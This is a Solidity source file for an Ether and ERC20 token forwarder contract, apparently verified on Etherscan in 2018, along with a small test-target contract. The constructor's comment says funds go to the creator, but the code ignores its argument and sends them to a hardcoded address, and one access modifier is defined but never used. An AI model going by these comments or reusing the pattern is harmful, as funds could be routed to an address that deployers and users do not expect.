1 /**
2  *Submitted for verification at Etherscan.io on 2018-12-11
3 */
4 
5 pragma solidity ^0.4.11;
6 /**
7  * Contract that exposes the needed erc20 token functions
8  */
9 
10 contract ERC20Interface {
11   // Send _value amount of tokens to address _to
12   function transfer(address _to, uint256 _value) public returns (bool success);
13   // Get the account balance of another account with address _owner
14   function balanceOf(address _owner) public constant returns (uint256 balance);
15 }
16 /**
17  * Contract that will forward any incoming Ether to the creator of the contract
18  */
19 contract Forwarder {
20   // Address to which any funds sent to this contract will be forwarded
21   address public parentAddress;
22   event ForwarderDeposited(address from, uint value, bytes data);
23 
24   /**
25    * Create the contract, and sets the destination address to that of the creator
26    */
27   function Forwarder(address pool) public {
28     parentAddress = 0x7cdB2Ce858ACe1d9eE41E1C5b12D581075055B2B;
29   }
30  
31   /**
32    * Modifier that will execute internal code block only if the sender is the parent address
33    */
34   modifier onlyParent {
35     if (msg.sender != parentAddress) {
36       revert();
37     }
38     _;
39   }
40 
41   /**
42    * Default function; Gets called when Ether is deposited, and forwards it to the parent address
43    */
44   function() public payable {
45     // throws on failure
46     parentAddress.transfer(msg.value);
47     // Fire off the deposited event if we can forward it
48     ForwarderDeposited(msg.sender, msg.value, msg.data);
49   }
50 
51   /**
52    * Execute a token transfer of the full balance from the forwarder token to the parent address
53    * @param tokenContractAddress the address of the erc20 token contract
54    */
55   function flushTokens(address tokenContractAddress) public {
56     ERC20Interface instance = ERC20Interface(tokenContractAddress);
57     var forwarderAddress = address(this);
58     var forwarderBalance = instance.balanceOf(forwarderAddress);
59     if (forwarderBalance == 0) {
60       return;
61     }
62     if (!instance.transfer(parentAddress, forwarderBalance)) {
63       revert();
64     }
65   }
66 
67   /**
68    * It is possible that funds were sent to this address before the contract was deployed.
69    * We can flush those funds to the parent address.
70    */
71   function flush() public {
72     // throws on failure
73     parentAddress.transfer(this.balance);
74   }
75 }
76 
77 // This is a test target for a Forwarder.
78 // It contains a public function with a side-effect.
79 contract ForwarderTarget {
80   uint public data;
81 
82   function ForwarderTarget() public {
83   }
84 
85   function createForwarder(address pool) public returns (address) {
86     return new Forwarder(pool);
87   }
88 
89   function() public payable {
90     // accept unspendable balance
91   }
92 }